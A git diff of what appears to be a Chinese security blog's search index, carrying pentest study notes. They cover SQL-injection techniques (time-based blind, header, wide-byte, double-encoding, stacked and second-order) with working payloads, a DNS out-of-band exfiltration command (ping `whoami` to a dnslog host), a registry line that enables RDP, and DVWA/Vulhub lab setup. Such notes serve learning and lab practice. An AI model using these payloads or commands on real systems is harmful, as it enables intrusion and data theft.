+<td>and  if((length((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取表名</td>
+<td>and  if((ascii((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=100),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段长度</td>
+<td>and  if((length((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段名</td>
+<td>and  if((ascii((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取数据长度</td>
+<td>and  if((length((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取字段名</td>
+<td>and  if((ascii((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
+</tr>
+</tbody></table>
+<p>sleep可用benchmark代替</p>
+<p>benchmark(arg1,arg2)</p>
+<p>arg1为执行次数，arg2为执行语句</p>
+<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
+<pre class="highlight"><span class="line">benchmark(5000000,md5(123))  		#执行500万次MD5加密  </span><br></pre>
+
+<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
+<h2 id="5、请求头注入"><a href="#5、请求头注入" class="headerlink" title="5、请求头注入"></a>5、请求头注入</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User-Agent</td>
+<td>浏览器版本</td>
+</tr>
+<tr>
+<td>X-Forwarded-For</td>
+<td>获取HTTP请求端的真实IP</td>
+</tr>
+</tbody></table>
+<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
+<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
+<p>报错注入和bool盲注</p>
+<h2 id="6、内联注入"><a href="#6、内联注入" class="headerlink" title="6、内联注入"></a>6、内联注入</h2><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
+<p>找到留言板的显示位，在显示位上进行sql注入。</p>
+<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
+<p>使用</p>
+<p>不用注释，用截断代替，然后使用多个and/or连接</p>
+<p>注：前面为true用and；前面为false用or</p>
+<pre class="highlight"><span class="line">1、&#x27;firefox&#x27; and &#x27; &#x27;        	#补齐</span><br><span class="line"></span><br><span class="line">2、&#x27;firefox&#x27; and payload and &#x27; &#x27;</span><br></pre>
+
+<p>注：内联注入查询多个表的字段时（特别是有相同名称的字段时），可用select as语句优化语法</p>
+<pre class="highlight"><span class="line">1、</span><br><span class="line">SELECT article.title,article.content,user.username FROM article, user</span><br><span class="line">WHERE article.aid=1 AND article.uid=user.uid</span><br><span class="line"></span><br><span class="line">SELECT a.title,a.content,u.username FROM article AS a, user AS u where a.aid=1 and a.uid=u.uid</span><br><span class="line">上述两条语句意思相同，但是select as重命名，简化输入的同时避免歧义</span><br><span class="line"></span><br><span class="line">2、</span><br><span class="line">SELECT userName AS a,userAddress AS b FROM TestTable WHERE a like &#x27;%am%&#x27; </span><br><span class="line">该语句执行是会报错，因为 别名只是对字段的一种引用，不能当作字段一样使用，如果真要把别名当字段一样使用，可以如下变通：</span><br><span class="line">SELECT a, b FROM(SELECT userName AS a,userAddress AS b FROM TestTable) AS tempTable WHERE a like &#x27;%dd%&#x27; </span><br><span class="line">如此，便可把别名当字段一样使用了</span><br><span class="line"></span><br><span class="line">注：as可省略，但不建议</span><br></pre>
+
+
+
+<h2 id="7、宽字节注入（单双引号页面无变化）"><a href="#7、宽字节注入（单双引号页面无变化）" class="headerlink" title="7、宽字节注入（单双引号页面无变化）"></a>7、宽字节注入（单双引号页面无变化）</h2><pre class="highlight"><span class="line">mysql语句执行时，现将数据转成16进制，再执行</span><br><span class="line"></span><br><span class="line">GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</span><br><span class="line"></span><br><span class="line">ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</span><br><span class="line"></span><br><span class="line">当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</span><br><span class="line"></span><br><span class="line">原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</span><br><span class="line"></span><br><span class="line">但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</span><br><span class="line"></span><br><span class="line">此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</span><br></pre>
+
+<p>利用：构造?id=1%df’即可</p>
+<p>注意：通常出现在斜杠转义单双引号的网页</p>
+<p>%df可以为任何hex码在81-FE之间的数据</p>
+<p>宽字节注入存在条件</p>
+<p>PHP+Mysql+GBK</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>编码语句</td>
+<td>mysql_set_charset(“gbk”)<br>mysql_query(“set names gbk”)</td>
+</tr>
+<tr>
+<td>转义语句</td>
+<td>addslashes(‘’)<br>mysql_real_escape_string(‘’)</td>
+</tr>
+</tbody></table>
+<p>上述四条语句组合中，除了</p>
+<p>mysql_set_charset(“gbk”)+mysql_real_escape_string(‘’)组合，其他组合均存在宽字节注入</p>
+<h2 id="8、二次编码注入-单双引号页面无变化"><a href="#8、二次编码注入-单双引号页面无变化" class="headerlink" title="8、二次编码注入(单双引号页面无变化)"></a>8、二次编码注入(单双引号页面无变化)</h2><table>
+<thead>
+<tr>
+<th>正确流程</th>
+<th>错误流程（二次编码注入）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php自动进行一次url解码  网站二次解码  转义单双引号进行防护  写入数据库</td>
+<td>php自动解码  转义防护  网站二次解码  urldecode()、rawurldecode()  写入数据库</td>
+</tr>
+</tbody></table>
+<pre class="highlight"><span class="line">单引号二次url编码为：%2527</span><br><span class="line"></span><br><span class="line">双引号二次url编码为：%2522</span><br></pre>
+
+<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
+<p>其他：</p>
+<p>文件上传时，可通过文件名进行sql注入</p>
+<h2 id="9、堆叠注入"><a href="#9、堆叠注入" class="headerlink" title="9、堆叠注入"></a>9、堆叠注入</h2><p>前提：存在sql注入</p>
+<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）。不建议使用update、delect等危险语句！</p>
+<p>堆叠注入存在场景</p>
+<table>
+<thead>
+<tr>
+<th>搭配</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mssql+asp/php/jsp</td>
+<td>堆叠注入</td>
+</tr>
+<tr>
+<td>mysql+php</td>
+<td></td>
+</tr>
+<tr>
+<td>mysql_connect()/mysql_query(“select  $id”)</td>
+<td>不能堆叠注入</td>
+</tr>
+<tr>
+<td>mysqli_connect()/mysqli_query(“select  $id”)</td>
+<td>不能堆叠注入</td>
+</tr>
+<tr>
+<td>mysqli_connect()/multi_query(“select  $id”)</td>
+<td>堆叠注入</td>
+</tr>
+<tr>
+<td>new  PDO()/bindvalue(“select ?”) execute($id)</td>
+<td>不能注入</td>
+</tr>
+<tr>
+<td>new  PDO()/query(“select $id”)</td>
+<td>堆叠注入</td>
+</tr>
+</tbody></table>
+<h2 id="10、二阶注入"><a href="#10、二阶注入" class="headerlink" title="10、二阶注入"></a>10、二阶注入</h2><p>存储在数据库汇总的数据，在使用时发生的注入</p>
+<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
+<p>当使用该数据时，被取出，这时注入语句生效</p>
+<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
+<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>去掉单引号</td>
+<td>现实场景常用单引号，去掉不合实际</td>
+</tr>
+<tr>
+<td>转义单引号</td>
+<td>对数字型无效（数字型不需要引号）  斜杠转义  addslashes()函数转义  php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
+</tr>
+<tr>
+<td>强制类型转换</td>
+<td>针对数字型  intval()</td>
+</tr>
+<tr>
+<td>更改数据库连接方式</td>
+<td>POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
-        <category>附加</category>
+        <category>Web渗透</category>
       </categories>
       <tags>
-        <tag>Typora</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -983,86 +1760,42 @@
       </tags>
   </entry>
   <entry>
-    <title>Web渗透随记</title>
-    <url>/article/3d2e94d4.html</url>
-    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
-<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
+    <title>Ubuntu搭建Docker + Vulhub</title>
+    <url>/article/a438e427.html</url>
+    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
+<pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">docker -v	#查看版本</span><br></pre>
 
-<p>（注：``为优先运行符，可以用$()代替）</p>
-<p>适用：</p>
-<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
-<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
-<p>开启：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
+<p>2、安装pip</p>
+<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>
 
-<p>关闭：</p>
-<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
+<p>3、安装docker-compose</p>
+<pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>
 
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7搭建DVWA</title>
-    <url>/article/bfa55e85.html</url>
-    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
-<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+<p>4、拉取vulhub</p>
+<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>
 
 
 
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
+<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><p>1、查看正在运行的容器信息</p>
+<pre class="highlight"><span class="line">docker ps</span><br></pre>
 
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+<p>2、进入容器目录</p>
+<pre class="highlight"><span class="line">docker attach +容器ID</span><br><span class="line">或docker exec -it +容器ID /bin/bash</span><br></pre>
 
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+<p>3、退出容器</p>
+<pre class="highlight"><span class="line">exit</span><br></pre>
 
 
 
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+<p>其他命令：</p>
+<pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>
 
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改密码为dvwa</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br></pre>
-
-
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
-
-<p>创建数据库</p>
-<p>登录（admin:password）</p>
 ]]></content>
       <categories>
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>DVWA</tag>
+        <tag>Vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1103,6 +1836,32 @@
 ]]></content>
       <tags>
         <tag>Java环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web渗透随记</title>
+    <url>/article/3d2e94d4.html</url>
+    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
+<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>
+
+<p>（注：``为优先运行符，可以用$()代替）</p>
+<p>适用：</p>
+<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
+<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
+<p>开启：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
+
+<p>关闭：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -1150,7 +1909,7 @@
 <p>注意：mssql账号为sa</p>
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
         <tag>IIS</tag>
@@ -1269,184 +2028,64 @@
         <category>Web渗透</category>
       </categories>
       <tags>
-        <tag>添加用户</tag>
         <tag>提权</tag>
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu搭建Docker + Vulhub</title>
-    <url>/article/a438e427.html</url>
-    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
-<pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">docker -v	#查看版本</span><br></pre>
-
-<p>2、安装pip</p>
-<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>
-
-<p>3、安装docker-compose</p>
-<pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>
-
-<p>4、拉取vulhub</p>
-<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>
+    <title>centos7搭建DVWA</title>
+    <url>/article/bfa55e85.html</url>
+    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
 
 
 
-<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><p>1、查看正在运行的容器信息</p>
-<pre class="highlight"><span class="line">docker ps</span><br></pre>
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
 
-<p>2、进入容器目录</p>
-<pre class="highlight"><span class="line">docker attach +容器ID</span><br><span class="line">或docker exec -it +容器ID /bin/bash</span><br></pre>
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
 
-<p>3、退出容器</p>
-<pre class="highlight"><span class="line">exit</span><br></pre>
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
 
-
-
-<p>其他命令：</p>
-<pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Linxu</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
-        <tag>Vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建LAMP环境</title>
-    <url>/article/a964a121.html</url>
-    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
-<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
-
-
-
-<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-
-
-<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
-
-
-
-<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
 
 <p>设置mysql密码（非操作系统密码）</p>
-<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+
+
+
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
 <pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
 
-<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
 <pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
 
-<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
-
-<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
-<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
-
-<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
-<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
 
 
 
-<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
 
-<p>（注意！wp-config.php  删除可重装wp网站）</p>
-<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改密码为dvwa</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br></pre>
 
-<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
-<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
+
+
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
+
+<p>创建数据库</p>
+<p>登录（admin:password）</p>
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>Apache环境搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建Nginx + 直播推流平台</title>
-    <url>/article/f9829b94.html</url>
-    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
-
-
-
-<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>
-
-
-
-<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>
-
-<p>注：需要下载配置环境</p>
-<p>如：</p>
-<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>
-
-
-
-<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>
-
-<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
-<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
-<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>
-
-<p>至此，访问80端口可看到Nginx测试页</p>
-<p> 下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
